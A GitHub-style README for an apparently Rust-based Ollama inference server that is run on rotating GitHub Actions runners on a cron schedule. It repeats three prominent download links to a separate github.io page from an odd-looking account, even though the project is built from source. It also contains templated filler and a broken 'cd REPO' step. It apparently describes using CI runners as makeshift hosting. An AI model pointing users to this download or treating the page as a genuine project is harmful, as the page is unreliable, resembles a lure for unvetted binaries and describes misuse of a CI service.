# AI Server - LLM Inference Server 2026

> **AI Server is an inference service written in Rust for Ollama-hosted large language models. GitHub Actions manages its deployment with configurable runners, schedules, model choices, and API endpoints.**

[![Platform](https://img.shields.io/badge/Platform-GitHub%20Actions-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/priceisaacuwjh3036/ai-server-rust-llm-api?style=flat-square)](https://github.com/priceisaacuwjh3036/ai-server-rust-llm-api)

---

<p align="center">
  <a href="https://priceisaacuwjh3036.github.io/ai-server-rust-llm-api/">
    <img src="https://img.shields.io/badge/Download-AI%20Server%20Latest-brightgreen?style=for-the-badge" alt="Download AI Server">
  </a>
</p>

> **[Download AI Server](https://priceisaacuwjh3036.github.io/ai-server-rust-llm-api/)**

---

[Download Latest Build](https://priceisaacuwjh3036.github.io/ai-server-rust-llm-api/)

---

## Overview

AI Server exposes an inference API for large language models provided by Ollama. The service layer is implemented in Rust, while GitHub Actions workflows coordinate deployment work on the runners defined for the project.

It is intended for developers and teams that want a repeatable, workflow-based approach to serving Ollama models. Rather than handling each deployment manually, repository workflows can define the model, deployment schedule, runner behavior, and service endpoint as these values change over time.

---

## Capabilities

- Makes Ollama-hosted large language models available through an inference API
- Implements the server in Rust
- Runs deployments on GitHub Actions runners
- Automates runner rotation and replacement
- Allows redeployment on a cron schedule
- Updates frontend endpoints when the deployment location changes
- Sets model choices and deployment timing through workflows
- Offers workflow-level controls for runners and API endpoints

---

## Getting Started

First, check out the repository:

```bash
git clone https://github.com/priceisaacuwjh3036/ai-server-rust-llm-api.git
cd REPO
```

Create an optimized Rust build with Cargo:

```bash
cargo build --release
```

GitHub Actions workflows perform the deployment. Before launching one, provide the required workflow values, choose the model and schedule, and then run the appropriate workflow from the repository's **Actions** tab.

---

## Operating the Service

The deployment process generally follows these steps:

1. Go to the repository's **Actions** tab.
2. Select the workflow responsible for deployment.
3. Provide the Ollama model and runner settings.
4. Launch the workflow manually or let its cron schedule trigger it.
5. Connect the frontend or another client to the inference API endpoint produced by the deployment.
6. If the deployment location changes, use the replacement endpoint provided by the workflow process.

To build and start the service locally during development, run:

```bash
cargo run --release
```

Check the repository configuration for the supported runtime options and workflow inputs before initiating a deployment.

---

## Settings and Deployment Configuration

GitHub Actions workflow settings and the project's repository configuration determine how the service operates. Configuration areas include:

- The Ollama model to serve
- GitHub Actions runner options
- Runner replacement and rotation behavior
- Cron timing for redeployment
- Inference API endpoint values
- Frontend endpoint refreshes

Store deployment-specific values in the workflow configuration used by the project. Endpoint settings should be reviewed after any runner change or move to a different deployment location.

---

## Prerequisites

- A GitHub repository where GitHub Actions is enabled
- GitHub Actions runners that can be used for deployment
- Ollama installed and configured with the models to be served
- Rust and Cargo for local builds and execution
- Network connectivity from clients to the exposed inference API
- Enough storage for the selected Ollama models

---

## Frequently Asked Questions

### What models are supported?

AI Server is designed to serve models available through Ollama. The workflow configuration determines which model name is used.

### How do I launch a deployment?

Use the relevant GitHub Actions workflow to start a deployment. A cron-based schedule may also be configured for automatic redeployment.

### How is runner replacement handled?

The workflow process includes runner replacement and rotation behavior. When the service moves to a new deployment location, the related frontend endpoint values can be refreshed.

### Where are the model and schedule defined?

The repository workflows and related project configuration contain the model selection, schedule, runner settings, and endpoint values.

### What should I check if deployment fails?

Begin with the logs for the affected GitHub Actions run. Then confirm that the chosen model, runner availability, schedule settings, and generated endpoint values are correct.

### How do I stay current?

Pull the newest repository changes and inspect the workflow configuration after updating. Actual deployment behavior can vary with the configured runner, model, and endpoint settings.

---

## License

This project is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the complete license text.
